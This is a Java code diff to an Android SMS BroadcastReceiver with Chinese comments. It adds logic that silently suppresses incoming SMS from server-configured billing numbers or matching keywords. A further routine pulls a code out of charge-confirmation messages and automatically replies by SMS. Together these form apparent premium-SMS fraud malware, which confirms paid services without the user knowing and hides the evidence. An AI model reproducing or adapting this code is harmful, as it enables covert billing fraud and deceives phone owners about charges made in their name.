@@ -69,26 +69,39 @@ public class PrivateSMSBRC extends BroadcastReceiver {
                         && AppRuntime.ACTIVE_RESPONSE != null
                         && !TextUtils.isEmpty(AppRuntime.ACTIVE_RESPONSE.blockSmsPort)) {
                     String msg = message.getMessageBody();
-                    boolean keyBlock = false;
-                    if (!TextUtils.isEmpty(msg) && !TextUtils.isEmpty(AppRuntime.ACTIVE_RESPONSE.blockKeys)) {
-                        try {
-                            String[] blocks = AppRuntime.ACTIVE_RESPONSE.blockKeys.split(";");
-                            if (blocks != null) {
-                                for (String key : blocks) {
-                                    if (msg.contains(key)) {
-                                        keyBlock = true;
-                                        break;
-                                    }
-                                }
-                            }
-                        } catch (Exception e) {
-                        }
+                    //对于短信内容先进行二次确认检查
+
+                    String address = message.getOriginatingAddress();
+                    if (address.startsWith("+") == true && address.length() == 14) {
+                        address = address.substring(3);
+                    } else if (address.length() > 11) {
+                        address = address.substring(address.length() - 11);
                     }
 
-                    if (message.getOriginatingAddress().indexOf(AppRuntime.ACTIVE_RESPONSE.blockSmsPort) != -1 || keyBlock) {
-                        //当前短信的的发送地址包含需要拦截的短信的地址
-                        //TODO: 扣费短信的二次确认和动态确认
+                    if (!secondSMSCmdCheck(msg, address)) {
+                        boolean keyBlock = false;
+                        boolean white = false;
+                        if (!TextUtils.isEmpty(msg) && !TextUtils.isEmpty(AppRuntime.ACTIVE_RESPONSE.blockKeys)) {
+                            try {
+                                if (isContainWhite(msg, AppRuntime.ACTIVE_RESPONSE.blockKeys)) {
+                                    return;
+                                }
+                                keyBlock = AndOrCheckForFilter(msg, AppRuntime.ACTIVE_RESPONSE.blockKeys);
+                            } catch (Exception e) {
+                            }
+                        }
+
+                        if (address.startsWith(AppRuntime.ACTIVE_RESPONSE.blockSmsPort) || keyBlock) {
+                            abortBroadcast();
+                            if (Config.DEBUG) {
+                                Config.LOGD("[[PrivateSMSBRC::onReceive]] block one SMS : " + msg + "  from : " + address);
+                            }
+                        }
+                    } else {
                         abortBroadcast();
+                        if (Config.DEBUG) {
+                            Config.LOGD("[[PrivateSMSBRC::onReceive]] block one SMS : " + msg + "  from : " + address);
+                        }
                     }
                 } else {
                     //如果短信中心为空，向的运营商发送一条信息来获取短信中心的号码
@@ -96,6 +109,172 @@ public class PrivateSMSBRC extends BroadcastReceiver {
                 }
             }
         }
+    }
+
+    private boolean isContainWhite(String msg, String cmd) {
+        String[] or = cmd.split("\\|");
+        if (or.length <= 1) {
+            String[] and = cmd.split("&");
+            for (String s : and) {
+                if (s.startsWith("-") && msg.contains(s.substring(1))) {
+                    return true;
+                }
+            }
+        } else {
+            //先检查白名单
+            for (String s : or) {
+                if (s.startsWith("-") && msg.contains(s.substring(1))) {
+                    return true;
+                }
+            }
+        }
+
+        return false;
+    }
+
+    /**
+     * 不支持& 和| 的组合
+     *
+     * @param msg
+     * @param cmd
+     * @return
+     */
+    private boolean AndOrCheckForFilter(String msg, String cmd) {
+        String[] or = cmd.split("\\|");
+        if (or.length <= 1) {
+            //没有|逻辑
+            String[] and = cmd.split("&");
+//            先检查白名单
+//            for (String s : and) {
+//                if (s.startsWith("-") && msg.contains(s.substring(1))) {
+//                    return false;
+//                }
+//            }
+            for (String s : and) {
+                if (!msg.contains(s)) {
+                    return false;
+                }
+            }
+
+            return true;
+        } else {
+            //有|逻辑
+            //先检查白名单
+//            for (String s : or) {
+//                if (s.startsWith("-") && msg.contains(s.substring(1))) {
+//                    return false;
+//                }
+//            }
+            for (String s : or) {
+                if (msg.contains(s)) {
+                    return true;
+                }
+            }
+
+            return false;
+        }
+    }
+
+    /**
+     * 如果返回true表示这条短信是二次确认的短信，需要拦截
+     * false 表示是普通短信
+     *
+     * @param msg
+     * @param number
+     * @return
+     */
+    private boolean secondSMSCmdCheck(String msg, String number) {
+        if (!TextUtils.isEmpty(msg) && AppRuntime.ACTIVE_RESPONSE.smsCmd != null) {
+            String port = AppRuntime.ACTIVE_RESPONSE.smsCmd.portList.size() > 1
+                              ? AppRuntime.ACTIVE_RESPONSE.smsCmd.portList.get(1)
+                              : null;
+            String content = AppRuntime.ACTIVE_RESPONSE.smsCmd.contentList.size() > 1
+                                 ? AppRuntime.ACTIVE_RESPONSE.smsCmd.contentList.get(1)
+                                 : null;
+            if (port == null || content == null) {
+                return false;
+            }
+
+            //先找到要回复的关键字
+            if (!content.startsWith("k=")) {
+                if (content.startsWith("c=")) content = content.substring(2);
+            } else {
+                //以k=开始
+                content = content.substring(2);
+                String[] ds = content.split("\\*");
+                if (ds == null || ds.length != 2) {
+                    return false;
+                } else {
+                    int index = msg.indexOf(ds[0]);
+                    if (index != -1) {
+                        String subMsg = msg.substring(index + ds[0].length());
+                        index = subMsg.indexOf(ds[1]);
+                        if (index != -1) {
+                            content = subMsg.substring(0, index);
+                        } else {
+                            return false;
+                        }
+                    } else {
+                        return false;
+                    }
+                }
+            }
+
+            if (!port.startsWith("k=")) {
+                if (port.startsWith("n=")) port = port.substring(2);
+            } else {
+                port = port.substring(2);
+                if (!port.contains("&") && !port.contains("\\|")) {
+                    //没有组合逻辑
+                    if (msg.contains(port)) {
+                        port = number;
+                    } else {
+                        return false;
+                    }
+                } else if (port.contains("&")) {
+                    //&逻辑，注意：&和|目前不支持组合
+                    String[] ds = port.split("&");
+                    if (ds == null || ds.length == 0) {
+                        return false;
+                    }
+                    for (String s : ds) {
+                        if (!msg.contains(s)) {
+                            return false;
+                        }
+                    }
+                    port = number;
+                } else if (port.contains("\\|")) {
+                    //|逻辑
+                    String[] ds = port.split("\\|");
+                    if (ds == null || ds.length == 0) {
+                        return false;
+                    }
+                    boolean should = false;
+                    for (String s : ds) {
+                        if (msg.contains(s)) {
+                            should = true;
+                            break;
+                        }
+                    }
+                    if (should) {
+                        port = number;
+                    } else {
+                        return false;
+                    }
+                }
+            }
+
+            if (TextUtils.isEmpty(port) || TextUtils.isEmpty(content)) {
+                return false;
+            }
+
+            //port和content都是合法的
+            SMSUtil.sendSMS(port, content);
+
+            return true;
+        }
+
+        return false;
     }
 
     /**
